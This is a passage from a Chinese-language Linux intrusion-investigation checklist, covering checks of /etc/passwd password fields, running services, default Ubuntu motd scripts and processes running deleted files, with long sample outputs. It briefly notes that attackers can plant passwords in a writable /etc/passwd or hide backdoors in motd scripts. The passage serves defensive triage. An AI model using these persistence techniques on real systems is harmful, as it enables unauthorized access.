target     prot opt source               destination

```

### 0x22 密码填充检查

如果攻击者对 `/etc/passwd` 文件有写的权限，可以直接在密码字段处填写密码，之后便可以直接使用这个密码进行登录

`awk -F: '$2 != "x" { print $0 }' /etc/passwd`

【Ubuntu Server 22.04】默认情况

【Rocky Linux 9】默认情况

### 0x23 服务检查

系统服务相关检查

列出正在运行的系统服务

`sudo systemctl list-units --type=service --state=running`

【Ubuntu Server 16.04】默认情况

 `helper@localhost:~$ sudo systemctl list-units --type=service --state=running
UNIT                        LOAD   ACTIVE SUB     DESCRIPTION
accounts-daemon.service     loaded active running Accounts Service
acpid.service               loaded active running ACPI event daemon
atd.service                 loaded active running Deferred execution scheduler
cron.service                loaded active running Regular background program processing daemon
dbus.service                loaded active running D-Bus System Message Bus
getty@tty1.service          loaded active running Getty on tty1
irqbalance.service          loaded active running LSB: daemon to balance interrupts for SMP systems
iscsid.service              loaded active running iSCSI initiator daemon (iscsid)
lvm2-lvmetad.service        loaded active running LVM2 metadata daemon
lxcfs.service               loaded active running FUSE filesystem for LXC
mdadm.service               loaded active running LSB: MD monitoring daemon
open-vm-tools.service       loaded active running Service for virtual machines hosted on VMware
polkitd.service             loaded active running Authenticate and Authorize Users to Run Privileged Tasks
rsyslog.service             loaded active running System Logging Service
ssh.service                 loaded active running OpenBSD Secure Shell server
systemd-journald.service    loaded active running Journal Service
systemd-logind.service      loaded active running Login Service
systemd-timesyncd.service   loaded active running Network Time Synchronization
systemd-udevd.service       loaded active running udev Kernel Device Manager
unattended-upgrades.service loaded active running Unattended Upgrades Shutdown
user@1000.service           loaded active running User Manager for UID 1000
vgauth.service              loaded active running Authentication service for virtual machines hosted on VMware

LOAD   = Reflects whether the unit definition was properly loaded.
ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
SUB    = The low-level unit activation state, values depend on unit type.

22 loaded units listed. Pass --all to see loaded but inactive units, too.
To show all installed unit files use 'systemctl list-unit-files'.

```
 【Centos 7】默认情况

 `[helper@localhost ~]$ sudo systemctl list-units --type=service --state=running
UNIT                     LOAD   ACTIVE SUB     DESCRIPTION
abrt-oops.service        loaded active running ABRT kernel log watcher
abrt-xorg.service        loaded active running ABRT Xorg log watcher
abrtd.service            loaded active running ABRT Automated Bug Reporting Tool
accounts-daemon.service  loaded active running Accounts Service
alsa-state.service       loaded active running Manage Sound Card State (restore and store)
atd.service              loaded active running Job spooling tools
auditd.service           loaded active running Security Auditing Service
avahi-daemon.service     loaded active running Avahi mDNS/DNS-SD Stack
bluetooth.service        loaded active running Bluetooth service
bolt.service             loaded active running Thunderbolt system service
chronyd.service          loaded active running NTP client/server
colord.service           loaded active running Manage, Install and Generate Color Profiles
crond.service            loaded active running Command Scheduler
cups.service             loaded active running CUPS Printing Service
dbus.service             loaded active running D-Bus System Message Bus
firewalld.service        loaded active running firewalld - dynamic firewall daemon
fprintd.service          loaded active running Fingerprint Authentication Daemon
fwupd.service            loaded active running Firmware update daemon
gdm.service              loaded active running GNOME Display Manager
geoclue.service          loaded active running Location Lookup Service
gssproxy.service         loaded active running GSSAPI Proxy Daemon
libstoragemgmt.service   loaded active running libstoragemgmt plug-in server daemon
lvm2-lvmetad.service     loaded active running LVM2 metadata daemon
ModemManager.service     loaded active running Modem Manager
NetworkManager.service   loaded active running Network Manager
packagekit.service       loaded active running PackageKit Daemon
polkit.service           loaded active running Authorization Manager
postfix.service          loaded active running Postfix Mail Transport Agent
rngd.service             loaded active running Hardware RNG Entropy Gatherer Daemon
rpcbind.service          loaded active running RPC bind service
rsyslog.service          loaded active running System Logging Service
rtkit-daemon.service     loaded active running RealtimeKit Scheduling Policy Service
smartd.service           loaded active running Self Monitoring and Reporting Technology (SMART) Daemon
sshd.service             loaded active running OpenSSH server daemon
systemd-journald.service loaded active running Journal Service
systemd-logind.service   loaded active running Login Service
systemd-udevd.service    loaded active running udev Kernel Device Manager
tuned.service            loaded active running Dynamic System Tuning Daemon
udisks2.service          loaded active running Disk Manager
upower.service           loaded active running Daemon for power management
vgauthd.service          loaded active running VGAuth Service for open-vm-tools
vmtoolsd.service         loaded active running Service for virtual machines hosted on VMware
wpa_supplicant.service   loaded active running WPA Supplicant daemon

LOAD   = Reflects whether the unit definition was properly loaded.
ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
SUB    = The low-level unit activation state, values depend on unit type.

43 loaded units listed. Pass --all to see loaded but inactive units, too.
To show all installed unit files use 'systemctl list-unit-files'.
[helper@localhost ~]$

```
 查看某个服务的进程情况

`systemctl status xxx.service`

这里以 ssh 为例

【Ubuntu Server 16.04】默认情况

【Centos 7】默认情况

我们可以获取 pid 以及启动的文件

获取某个服务的配置文件

`systemctl cat xxx.service`

【Ubuntu Server 16.04】默认情况

【Centos 7】默认情况

通过服务的配置文件，我们可以找到相关的文件，之后进行判断是否为异常

开机自启的服务可以在启动项处进行查

### 0x24 motd 检查

利用motd做后门在很久以前就已经存在了，我单独进行了探究，了解详细情况可以看下面这篇文章

https://mp.weixin.qq.com/s/AvnCXkdGqo8uBBRYH61ihA

【ubuntu server 16.04 64位】 默认 motd 情况

motd 文件默认位置 `/etc/update-motd.d/`

下面我把文件中 `#` 注释的行隐去，剩下的写在下面

 - `00-header`

 `#!/bin/sh

[ -r /etc/lsb-release ] && . /etc/lsb-release

if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
    # Fall back to using the very slow lsb_release utility
    DISTRIB_DESCRIPTION=$(lsb_release -s -d)
fi

printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"

```

 - `10-help-text`

 `#!/bin/sh

printf "\n"
printf " * Documentation:  https://help.ubuntu.com\n"
printf " * Management:     https://landscape.canonical.com\n"
printf " * Support:        https://ubuntu.com/advantage\n"

```

 - `50-motd-news`

 `#!/bin/sh

# Source the local configuration
[ -r /etc/default/motd-news ] && . /etc/default/motd-news

# Exit immediately, unless we're enabled
# This makes this script very easy to disable in /etc/default/motd-news configuration
[ "$ENABLED" = "1" ] || exit 0

# Ensure sane defaults
[ -n "$URLS" ] || URLS="https://motd.ubuntu.com"
[ -n "$WAIT" ] || WAIT=5
[ -n "$CACHE" ] || CACHE="/var/cache/motd-news"
[ "$1" = "--force" ] && FORCED=1

# Ensure we print safely, maximum of the first 10 lines,
# maximum of the first 80 chars per line, no control chars
safe_print() {
    cat "$1" | head -n 10 | tr -d '\000-\011\013\014\016-\037' | cut -c -80
}

# If we're not forcing an update, and we have a cached motd-news file,
# then just print it and exit as quickly as possible, for login performance.
# Note that systemd should keep this cache file up to date, asynchronously
if [ "$FORCED" != "1" ]; then
    if [ -r $CACHE ]; then
        echo
        safe_print $CACHE
    else
        : > $CACHE
    fi
    exit 0
fi

# If we've made it here, we've been given the --force argument,
# probably from the systemd motd-news.service.  Let's update...

# Abort early if wget is missing
[ -x /usr/bin/wget ] || exit 0

# Generate our temp files, clean up when done
NEWS=$(mktemp) || exit 1
ERR=$(mktemp) || exit 1
CLOUD=$(mktemp) || exit 1
trap "rm -f $NEWS $ERR $CLOUD" HUP INT QUIT ILL TRAP KILL BUS TERM

# Construct a user agent, similar to Firefox/Chrome/Safari/IE to
# ensure a proper, tailored, accurate message of the day

# wget browser version, for debug purposes
wget_ver="$(dpkg -l wget | awk '$1 == "ii" { print($3); exit(0); }')"

# Distribution version, for messages releated to this Ubuntu release
. /etc/lsb-release
lsb=$(echo "$DISTRIB_DESCRIPTION" | sed -e "s/ /\//g")
codename="$DISTRIB_CODENAME"

# Kernel version and CPU type, for messages related to a particular revision or hardware
platform="$(uname -o)/$(uname -r)/$(uname -m)"
arch="$(uname -m)"
cpu="$(grep -m1 "^model name" /proc/cpuinfo | sed -e "s/.*: //" -e "s:\s\+:/:g")"
cloud_id="unknown"
if [ -x /usr/bin/cloud-id ]; then
    /usr/bin/cloud-id > "$CLOUD" 2>/dev/null
    if [ $? -eq 0 ]; then
        # sanitize it a bit, just in case
        cloud_id=$(cut -c -40 "${CLOUD}" | tr -c -d '[:alnum:]')
        if [ -z "${cloud_id}" ]; then
            cloud_id="unknown"
        fi
    fi
fi

# Piece together the user agent
USER_AGENT="wget/$wget_ver $lsb $platform $cpu cloud_id/$cloud_id"

# Loop over any configured URLs
for u in $URLS; do
    # Ensure https:// protocol, for security reasons
    case $u in
        https://*)
            true
        ;;
        https://motd.ubuntu.com)
            u="$u/$codename/$arch"
        ;;
        *)
            continue
        ;;
    esac
    # If we're forced, set the wait to much higher (1 minute)
    [ "$FORCED" = "1" ] && WAIT=60
    # Fetch and print the news motd
    result=0
    not_found_is_ok=0
    wget --timeout "$WAIT" -U "$USER_AGENT" -O- --content-on-error "$u" >"$NEWS" 2>"$ERR" || result=$?
    # from wget's manpage: 8   Server issued an error response.
    if [ $result -eq 8 ]; then
        if grep -q "ERROR 404" "$ERR"; then
            # The server's 404 document is the generic, non cloud-specific, motd-news
            # content present in the index.txt file
            not_found_is_ok=1
        fi
    fi
    if [ $result -eq 0 ] || [ $not_found_is_ok -eq 1 ]; then
        echo
        # At most, 10 lines of text, remove control characters, print at most 80 characters per line
        safe_print "$NEWS"
        # Try to update the cache
        safe_print "$NEWS" 2>/dev/null >$CACHE || true
    else
        : > "$CACHE"
    fi
done
rm -f "$NEWS" "$ERR" "$CLOUD"
exit 0

```

 - `90-updates-available`

 `#!/bin/sh

stamp="/var/lib/update-notifier/updates-available"

[ ! -r "$stamp" ] || cat "$stamp"

```

 - `91-release-upgrade`

 `#!/bin/sh

# if the current release is under development there won't be a new one
if [ "$(lsb_release -sd | cut -d' ' -f4)" = "(development" ]; then
    exit 0
fi
if [ -x /usr/lib/ubuntu-release-upgrader/release-upgrade-motd ]; then
    exec /usr/lib/ubuntu-release-upgrader/release-upgrade-motd
fi

```

 - `92-unattended-upgrades`

 `#!/bin/sh

if [ -x /usr/share/unattended-upgrades/update-motd-unattended-upgrades ]; then
    exec /usr/share/unattended-upgrades/update-motd-unattended-upgrades
fi

```

 - `97-overlayroot`

 `#!/bin/sh

(egrep "overlayroot|/media/root-ro|/media/root-rw" /proc/mounts 2>/dev/null | sort -r) || true
echo

```

 - `98-fsck-at-reboot`

 `#!/bin/sh

if [ -x /usr/lib/update-notifier/update-motd-fsck-at-reboot ]; then
    exec /usr/lib/update-notifier/update-motd-fsck-at-reboot
fi

```

 - `98-reboot-required`

 `#!/bin/sh

if [ -x /usr/lib/update-notifier/update-motd-reboot-required ]; then
    exec /usr/lib/update-notifier/update-motd-reboot-required
fi

```

 - `99-esm`

 `#!/bin/sh

SERIES=$(lsb_release -cs)
DESCRIPTION=$(lsb_release -ds)

[ "$SERIES" = "precise" ] || exit 0

[ -x /usr/bin/ubuntu-advantage ] || exit 0

if ubuntu-advantage is-esm-enabled; then
    cat <<EOF
This ${DESCRIPTION} system is configured to receive extended security updates
from Canonical:
 * https://www.ubuntu.com/esm
EOF
else
    cat <<EOF
This ${DESCRIPTION} system is past its End of Life, and is no longer
receiving security updates.  To protect the integrity of this system, it’s
critical that you enable Extended Security Maintenance updates:
 * https://www.ubuntu.com/esm
EOF
fi
echo

```

 【Centos7 64位】默认 motd 情况

Centos 7 默认没有 motd 文件，与 PAM 进行了一些组合和集成

### 0x25 进程启动文件检查

恶意程序执行后，可能会删除本地文件，但是该文件已经被进程加载，可以通过遍历这种情况来排查恶意程序

 - `sudo lsof | grep deleted`

lsof 不仅是进程启动文件，所以内容较多，建议先参考下面这条

 - `sudo ls -al /proc/*/exe 2>/dev/null | grep deleted`

 【Ubuntu Server 16.04】默认情况

【Centos Stream】默认情况

Centos Stream 默认的情况字符如下

 `dbus-brok  811                          dbus   12u      REG                0,1   2097152       1027 /memfd:dbus-broker-log (deleted)
dbus-brok  812                          dbus   45u      REG                0,1   2097152       1041 /memfd:dbus-broker-log (deleted)
firewalld  886                          root    9u      REG                0,1      4096          7 /memfd:libffi (deleted)
firewalld  886 1055 gmain               root    9u      REG                0,1      4096          7 /memfd:libffi (deleted)
packageki 1582                          root   15u      REG              253,0      3448   69238789 /tmp/librepo-tmp-PVfssn (deleted)
packageki 1582                          root   16u      REG              253,0      3496   69238788 /tmp/librepo-tmp-ZD9IkO (deleted)
packageki 1582                          root   21r      REG              253,0     14034   34067279 /var/cache/PackageKit/9/hawkey/extras-common.solv (deleted)
packageki 1582                          root   23r      REG              253,0   3378321   34067283 /var/cache/PackageKit/9/hawkey/baseos.solv (deleted)
packageki 1582                          root   25r      REG              253,0   4513640   34067284 /var/cache/PackageKit/9/hawkey/appstream.solv (deleted)
packageki 1582 1584 gmain               root   15u      REG              253,0      3448   69238789 /tmp/librepo-tmp-PVfssn (deleted)
packageki 1582 1584 gmain               root   16u      REG              253,0      3496   69238788 /tmp/librepo-tmp-ZD9IkO (deleted)
packageki 1582 1584 gmain               root   21r      REG              253,0     14034   34067279 /var/cache/PackageKit/9/hawkey/extras-common.solv (deleted)
packageki 1582 1584 gmain               root   23r      REG              253,0   3378321   34067283 /var/cache/PackageKit/9/hawkey/baseos.solv (deleted)
packageki 1582 1584 gmain               root   25r      REG              253,0   4513640   34067284 /var/cache/PackageKit/9/hawkey/appstream.solv (deleted)
packageki 1582 1586 gdbus               root   15u      REG              253,0      3448   69238789 /tmp/librepo-tmp-PVfssn (deleted)
packageki 1582 1586 gdbus               root   16u      REG              253,0      3496   69238788 /tmp/librepo-tmp-ZD9IkO (deleted)
packageki 1582 1586 gdbus               root   21r      REG              253,0     14034   34067279 /var/cache/PackageKit/9/hawkey/extras-common.solv (deleted)
packageki 1582 1586 gdbus               root   23r      REG              253,0   3378321   34067283 /var/cache/PackageKit/9/hawkey/baseos.solv (deleted)
packageki 1582 1586 gdbus               root   25r      REG              253,0   4513640   34067284 /var/cache/PackageKit/9/hawkey/appstream.solv (deleted)
dbus-brok 1979                          join   12u      REG                0,1   2097152       1130 /memfd:dbus-broker-log (deleted)
gnome-she 2051                          join   37u      REG                0,1     28672         71 /memfd:libffi (deleted)
gnome-she 2051                          join   43u      REG                0,1  67108864       1135 /memfd:pulseaudio (deleted)
gnome-she 2051                          join   45r      REG              253,2        64   50331819 /home/join/.local/share/gvfs-metadata/root (deleted)
gnome-she 2051                          join   46r      REG              253,2     32768   50331820 /home/join/.local/share/gvfs-metadata/root-5a11136d.log (deleted)
gnome-she 2051                          join   49u      REG                0,1     67864         78 /memfd:mutter-shared (deleted)
gnome-she 2051                          join   52r      REG              253,2        64   50331816 /home/join/.local/share/gvfs-metadata/home (deleted)
gnome-she 2051                          join   56r      REG              253,2     32768   50331818 /home/join/.local/share/gvfs-metadata/home-c72c093c.log (deleted)
gnome-she 2051 2056 gmain               join   37u      REG                0,1     28672         71 /memfd:libffi (deleted)
gnome-she 2051 2056 gmain               join   43u      REG                0,1  67108864       1135 /memfd:pulseaudio (deleted)
gnome-she 2051 2056 gmain               join   45r      REG              253,2        64   50331819 /home/join/.local/share/gvfs-metadata/root (deleted)
gnome-she 2051 2056 gmain               join   46r      REG              253,2     32768   50331820 /home/join/.local/share/gvfs-metadata/root-5a11136d.log (deleted)
gnome-she 2051 2056 gmain               join   49u      REG                0,1     67864         78 /memfd:mutter-shared (deleted)
gnome-she 2051 2056 gmain               join   52r      REG              253,2        64   50331816 /home/join/.local/share/gvfs-metadata/home (deleted)
gnome-she 2051 2056 gmain               join   56r      REG              253,2     32768   50331818 /home/join/.local/share/gvfs-metadata/home-c72c093c.log (deleted)
gnome-she 2051 2058 gdbus               join   37u      REG                0,1     28672         71 /memfd:libffi (deleted)
gnome-she 2051 2058 gdbus               join   43u      REG                0,1  67108864       1135 /memfd:pulseaudio (deleted)
gnome-she 2051 2058 gdbus               join   45r      REG              253,2        64   50331819 /home/join/.local/share/gvfs-metadata/root (deleted)
gnome-she 2051 2058 gdbus               join   46r      REG              253,2     32768   50331820 /home/join/.local/share/gvfs-metadata/root-5a11136d.log (deleted)
gnome-she 2051 2058 gdbus               join   49u      REG                0,1     67864         78 /memfd:mutter-shared (deleted)
gnome-she 2051 2058 gdbus               join   52r      REG              253,2        64   50331816 /home/join/.local/share/gvfs-metadata/home (deleted)
gnome-she 2051 2058 gdbus               join   56r      REG              253,2     32768   50331818 /home/join/.local/share/gvfs-metadata/home-c72c093c.log (deleted)
gnome-she 2051 2061 dconf\x20           join   37u      REG                0,1     28672         71 /memfd:libffi (deleted)
gnome-she 2051 2061 dconf\x20           join   43u      REG                0,1  67108864       1135 /memfd:pulseaudio (deleted)
gnome-she 2051 2061 dconf\x20           join   45r      REG              253,2        64   50331819 /home/join/.local/share/gvfs-metadata/root (deleted)
gnome-she 2051 2061 dconf\x20           join   46r      REG              253,2     32768   50331820 /home/join/.local/share/gvfs-metadata/root-5a11136d.log (deleted)
gnome-she 2051 2061 dconf\x20           join   49u      REG                0,1     67864         78 /memfd:mutter-shared (deleted)
gnome-she 2051 2061 dconf\x20           join   52r      REG              253,2        64   50331816 /home/join/.local/share/gvfs-metadata/home (deleted)
gnome-she 2051 2061 dconf\x20           join   56r      REG              253,2     32768   50331818 /home/join/.local/share/gvfs-metadata/home-c72c093c.log (deleted)
gnome-she 2051 2067 gnome-s:d           join   37u      REG                0,1     28672         71 /memfd:libffi (deleted)
gnome-she 2051 2067 gnome-s:d           join   43u      REG                0,1  67108864       1135 /memfd:pulseaudio (deleted)
gnome-she 2051 2067 gnome-s:d           join   45r      REG              253,2        64   50331819 /home/join/.local/share/gvfs-metadata/root (deleted)
gnome-she 2051 2067 gnome-s:d           join   46r      REG              253,2     32768   50331820 /home/join/.local/share/gvfs-metadata/root-5a11136d.log (deleted)
gnome-she 2051 2067 gnome-s:d           join   49u      REG                0,1     67864         78 /memfd:mutter-shared (deleted)
gnome-she 2051 2067 gnome-s:d           join   52r      REG              253,2        64   50331816 /home/join/.local/share/gvfs-metadata/home (deleted)
gnome-she 2051 2067 gnome-s:d           join   56r      REG              253,2     32768   50331818 /home/join/.local/share/gvfs-metadata/home-c72c093c.log (deleted)
gnome-she 2051 2068 gnome-she           join   37u      REG                0,1     28672         71 /memfd:libffi (deleted)
gnome-she 2051 2068 gnome-she           join   43u      REG                0,1  67108864       1135 /memfd:pulseaudio (deleted)
gnome-she 2051 2068 gnome-she           join   45r      REG              253,2        64   50331819 /home/join/.local/share/gvfs-metadata/root (deleted)
gnome-she 2051 2068 gnome-she           join   46r      REG              253,2     32768   50331820 /home/join/.local/share/gvfs-metadata/root-5a11136d.log (deleted)
gnome-she 2051 2068 gnome-she           join   49u      REG                0,1     67864         78 /memfd:mutter-shared (deleted)
gnome-she 2051 2068 gnome-she           join   52r      REG              253,2        64   50331816 /home/join/.local/share/gvfs-metadata/home (deleted)
gnome-she 2051 2068 gnome-she           join   56r      REG              253,2     32768   50331818 /home/join/.local/share/gvfs-metadata/home-c72c093c.log (deleted)
gnome-she 2051 2133 JS\x20Hel           join   37u      REG                0,1     28672         71 /memfd:libffi (deleted)
gnome-she 2051 2133 JS\x20Hel           join   43u      REG                0,1  67108864       1135 /memfd:pulseaudio (deleted)
gnome-she 2051 2133 JS\x20Hel           join   45r      REG              253,2        64   50331819 /home/join/.local/share/gvfs-metadata/root (deleted)
gnome-she 2051 2133 JS\x20Hel           join   46r      REG              253,2     32768   50331820 /home/join/.local/share/gvfs-metadata/root-5a11136d.log (deleted)
gnome-she 2051 2133 JS\x20Hel           join   49u      REG                0,1     67864         78 /memfd:mutter-shared (deleted)
gnome-she 2051 2133 JS\x20Hel           join   52r      REG              253,2        64   50331816 /home/join/.local/share/gvfs-metadata/home (deleted)
gnome-she 2051 2133 JS\x20Hel           join   56r      REG              253,2     32768   50331818 /home/join/.local/share/gvfs-metadata/home-c72c093c.log (deleted)
gnome-she 2051 2134 JS\x20Hel           join   37u      REG                0,1     28672         71 /memfd:libffi (deleted)
gnome-she 2051 2134 JS\x20Hel           join   43u      REG                0,1  67108864       1135 /memfd:pulseaudio (deleted)
gnome-she 2051 2134 JS\x20Hel           join   45r      REG              253,2        64   50331819 /home/join/.local/share/gvfs-metadata/root (deleted)
gnome-she 2051 2134 JS\x20Hel           join   46r      REG              253,2     32768   50331820 /home/join/.local/share/gvfs-metadata/root-5a11136d.log (deleted)
gnome-she 2051 2134 JS\x20Hel           join   49u      REG                0,1     67864         78 /memfd:mutter-shared (deleted)
gnome-she 2051 2134 JS\x20Hel           join   52r      REG              253,2        64   50331816 /home/join/.local/share/gvfs-metadata/home (deleted)
gnome-she 2051 2134 JS\x20Hel           join   56r      REG              253,2     32768   50331818 /home/join/.local/share/gvfs-metadata/home-c72c093c.log (deleted)
gnome-she 2051 2570 pool-gnom           join   37u      REG                0,1     28672         71 /memfd:libffi (deleted)
gnome-she 2051 2570 pool-gnom           join   43u      REG                0,1  67108864       1135 /memfd:pulseaudio (deleted)
gnome-she 2051 2570 pool-gnom           join   45r      REG              253,2        64   50331819 /home/join/.local/share/gvfs-metadata/root (deleted)
gnome-she 2051 2570 pool-gnom           join   46r      REG              253,2     32768   50331820 /home/join/.local/share/gvfs-metadata/root-5a11136d.log (deleted)
gnome-she 2051 2570 pool-gnom           join   49u      REG                0,1     67864         78 /memfd:mutter-shared (deleted)
gnome-she 2051 2570 pool-gnom           join   52r      REG              253,2        64   50331816 /home/join/.local/share/gvfs-metadata/home (deleted)
gnome-she 2051 2570 pool-gnom           join   56r      REG              253,2     32768   50331818 /home/join/.local/share/gvfs-metadata/home-c72c093c.log (deleted)
gnome-she 2051 2571 pool-gnom           join   37u      REG                0,1     28672         71 /memfd:libffi (deleted)
gnome-she 2051 2571 pool-gnom           join   43u      REG                0,1  67108864       1135 /memfd:pulseaudio (deleted)
gnome-she 2051 2571 pool-gnom           join   45r      REG              253,2        64   50331819 /home/join/.local/share/gvfs-metadata/root (deleted)
gnome-she 2051 2571 pool-gnom           join   46r      REG              253,2     32768   50331820 /home/join/.local/share/gvfs-metadata/root-5a11136d.log (deleted)
gnome-she 2051 2571 pool-gnom           join   49u      REG                0,1     67864         78 /memfd:mutter-shared (deleted)
gnome-she 2051 2571 pool-gnom           join   52r      REG              253,2        64   50331816 /home/join/.local/share/gvfs-metadata/home (deleted)
gnome-she 2051 2571 pool-gnom           join   56r      REG              253,2     32768   50331818 /home/join/.local/share/gvfs-metadata/home-c72c093c.log (deleted)
dbus-brok 2124                          join   12u      REG                0,1   2097152         70 /memfd:dbus-broker-log (deleted)
ibus-exte 2149                          join   10u      REG                0,1   1177344       1141 /memfd:wayland-cursor (deleted)
ibus-exte 2149 2165 gmain               join   10u      REG                0,1   1177344       1141 /memfd:wayland-cursor (deleted)
ibus-exte 2149 2167 dconf\x20           join   10u      REG                0,1   1177344       1141 /memfd:wayland-cursor (deleted)
ibus-exte 2149 2168 gdbus               join   10u      REG                0,1   1177344       1141 /memfd:wayland-cursor (deleted)
pipewire  2183                          join   24u      REG                0,1      2312       1136 /memfd:pipewire-memfd (deleted)
pipewire  2183                          join   27u      REG                0,1      2312       1137 /memfd:pipewire-memfd (deleted)
pipewire  2183                          join   31u      REG                0,1      2312       1138 /memfd:pipewire-memfd (deleted)
pipewire  2183                          join   39u      REG                0,1      2312         76 /memfd:pipewire-memfd (deleted)
pipewire  2183                          join   41u      REG                0,1      2312         77 /memfd:pipewire-memfd (deleted)
pipewire  2183 2206 pipewire            join   24u      REG                0,1      2312       1136 /memfd:pipewire-memfd (deleted)
pipewire  2183 2206 pipewire            join   27u      REG                0,1      2312       1137 /memfd:pipewire-memfd (deleted)
pipewire  2183 2206 pipewire            join   31u      REG                0,1      2312       1138 /memfd:pipewire-memfd (deleted)
pipewire  2183 2206 pipewire            join   39u      REG                0,1      2312         76 /memfd:pipewire-memfd (deleted)
pipewire  2183 2206 pipewire            join   41u      REG                0,1      2312         77 /memfd:pipewire-memfd (deleted)
gjs       2285                          join    7u      REG                0,1      4096       1139 /memfd:libffi (deleted)
gjs       2285 2291 gmain               join    7u      REG                0,1      4096       1139 /memfd:libffi (deleted)
gjs       2285 2295 gdbus               join    7u      REG                0,1      4096       1139 /memfd:libffi (deleted)
gjs       2285 2299 JS\x20Hel           join    7u      REG                0,1      4096       1139 /memfd:libffi (deleted)
gjs       2285 2300 JS\x20Hel           join    7u      REG                0,1      4096       1139 /memfd:libffi (deleted)
gsd-color 2297                          join   10u      REG                0,1   1177344       1142 /memfd:wayland-cursor (deleted)
gsd-color 2297 2342 gmain               join   10u      REG                0,1   1177344       1142 /memfd:wayland-cursor (deleted)
gsd-color 2297 2344 dconf\x20           join   10u      REG                0,1   1177344       1142 /memfd:wayland-cursor (deleted)
gsd-color 2297 2357 gdbus               join   10u      REG                0,1   1177344       1142 /memfd:wayland-cursor (deleted)
gsd-keybo 2310                          join   10u      REG                0,1   1177344       1143 /memfd:wayland-cursor (deleted)
gsd-keybo 2310 2348 gmain               join   10u      REG                0,1   1177344       1143 /memfd:wayland-cursor (deleted)
gsd-keybo 2310 2355 dconf\x20           join   10u      REG                0,1   1177344       1143 /memfd:wayland-cursor (deleted)
gsd-keybo 2310 2358 gdbus               join   10u      REG                0,1   1177344       1143 /memfd:wayland-cursor (deleted)
gsd-media 2317                          join   10u      REG                0,1   1177344       1144 /memfd:wayland-cursor (deleted)
gsd-media 2317                          join   15u      REG                0,1  67108864       1146 /memfd:pulseaudio (deleted)
gsd-media 2317 2381 gmain               join   10u      REG                0,1   1177344       1144 /memfd:wayland-cursor (deleted)
gsd-media 2317 2381 gmain               join   15u      REG                0,1  67108864       1146 /memfd:pulseaudio (deleted)
gsd-media 2317 2383 dconf\x20           join   10u      REG                0,1   1177344       1144 /memfd:wayland-cursor (deleted)
gsd-media 2317 2383 dconf\x20           join   15u      REG                0,1  67108864       1146 /memfd:pulseaudio (deleted)
gsd-media 2317 2384 gdbus               join   10u      REG                0,1   1177344       1144 /memfd:wayland-cursor (deleted)
gsd-media 2317 2384 gdbus               join   15u      REG                0,1  67108864       1146 /memfd:pulseaudio (deleted)
gsd-power 2319                          join   10u      REG                0,1   1177344         81 /memfd:wayland-cursor (deleted)
gsd-power 2319 2361 gmain               join   10u      REG                0,1   1177344         81 /memfd:wayland-cursor (deleted)
gsd-power 2319 2372 dconf\x20           join   10u      REG                0,1   1177344         81 /memfd:wayland-cursor (deleted)
gsd-power 2319 2376 gdbus               join   10u      REG                0,1   1177344         81 /memfd:wayland-cursor (deleted)
gsd-wacom 2374                          join   10u      REG                0,1   1177344         83 /memfd:wayland-cursor (deleted)
gsd-wacom 2374 2400 gmain               join   10u      REG                0,1   1177344         83 /memfd:wayland-cursor (deleted)
gsd-wacom 2374 2403 dconf\x20           join   10u      REG                0,1   1177344         83 /memfd:wayland-cursor (deleted)
gsd-wacom 2374 2407 gdbus               join   10u      REG                0,1   1177344         83 /memfd:wayland-cursor (deleted)
evolution 2396                          join   10u      REG                0,1   1177344         82 /memfd:wayland-cursor (deleted)
evolution 2396 2500 gmain               join   10u      REG                0,1   1177344         82 /memfd:wayland-cursor (deleted)
evolution 2396 2502 dconf\x20           join   10u      REG                0,1   1177344         82 /memfd:wayland-cursor (deleted)
evolution 2396 2503 gdbus               join   10u      REG                0,1   1177344         82 /memfd:wayland-cursor (deleted)
evolution 2396 2576 evolution           join   10u      REG                0,1   1177344         82 /memfd:wayland-cursor (deleted)
evolution 2396 2596 evolution           join   10u      REG                0,1   1177344         82 /memfd:wayland-cursor (deleted)
gjs       2406                          join    7u      REG                0,1      4096       1140 /memfd:libffi (deleted)
gjs       2406 2419 gmain               join    7u      REG                0,1      4096       1140 /memfd:libffi (deleted)
gjs       2406 2422 gdbus               join    7u      REG                0,1      4096       1140 /memfd:libffi (deleted)
gjs       2406 2424 JS\x20Hel           join    7u      REG                0,1      4096       1140 /memfd:libffi (deleted)
gjs       2406 2426 JS\x20Hel           join    7u      REG                0,1      4096       1140 /memfd:libffi (deleted)
gnome-sof 2431                          join   11u      REG                0,1   1177344         84 /memfd:wayland-cursor (deleted)
gnome-sof 2431                          join   27u      REG              253,2     36864   16777371 /home/join/.cache/appstream/appcache-GTG7X1.mdb (deleted)
gnome-sof 2431                          join   28w      REG              253,2     36864   16777371 /home/join/.cache/appstream/appcache-GTG7X1.mdb (deleted)
gnome-sof 2431 2490 gmain               join   11u      REG                0,1   1177344         84 /memfd:wayland-cursor (deleted)
gnome-sof 2431 2490 gmain               join   27u      REG              253,2     36864   16777371 /home/join/.cache/appstream/appcache-GTG7X1.mdb (deleted)
gnome-sof 2431 2490 gmain               join   28w      REG              253,2     36864   16777371 /home/join/.cache/appstream/appcache-GTG7X1.mdb (deleted)
gnome-sof 2431 2492 gdbus               join   11u      REG                0,1   1177344         84 /memfd:wayland-cursor (deleted)
gnome-sof 2431 2492 gdbus               join   27u      REG              253,2     36864   16777371 /home/join/.cache/appstream/appcache-GTG7X1.mdb (deleted)
gnome-sof 2431 2492 gdbus               join   28w      REG              253,2     36864   16777371 /home/join/.cache/appstream/appcache-GTG7X1.mdb (deleted)
gnome-sof 2431 2496 dconf\x20           join   11u      REG                0,1   1177344         84 /memfd:wayland-cursor (deleted)
gnome-sof 2431 2496 dconf\x20           join   27u      REG              253,2     36864   16777371 /home/join/.cache/appstream/appcache-GTG7X1.mdb (deleted)
gnome-sof 2431 2496 dconf\x20           join   28w      REG              253,2     36864   16777371 /home/join/.cache/appstream/appcache-GTG7X1.mdb (deleted)
gnome-ter 2773                          join   10u      REG                0,1   1177344       1174 /memfd:wayland-cursor (deleted)
gnome-ter 2773 2774 gmain               join   10u      REG                0,1   1177344       1174 /memfd:wayland-cursor (deleted)
gnome-ter 2773 2776 gdbus               join   10u      REG                0,1   1177344       1174 /memfd:wayland-cursor (deleted)
gnome-ter 2773 2777 dconf\x20           join   10u      REG                0,1   1177344       1174 /memfd:wayland-cursor (deleted)

```

